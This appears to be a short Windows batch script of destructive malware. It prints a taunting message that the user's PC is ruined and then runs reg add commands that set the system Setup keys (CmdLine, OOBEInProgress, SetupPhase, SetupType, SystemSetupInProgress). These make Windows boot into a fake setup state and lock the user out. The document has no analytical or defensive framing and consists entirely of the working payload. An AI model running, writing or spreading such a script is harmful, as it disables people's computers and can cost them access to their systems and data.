start color 2 tree
YOUR PC IS NOW FUCKED UP!!!!
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v CmdLine /t REG_SZ /d winver.exe /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v OOBEInProgress /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v SetupPhase /t REG_DWORD /d 4 /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v SetupType /t REG_DWORD /d 4 /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f
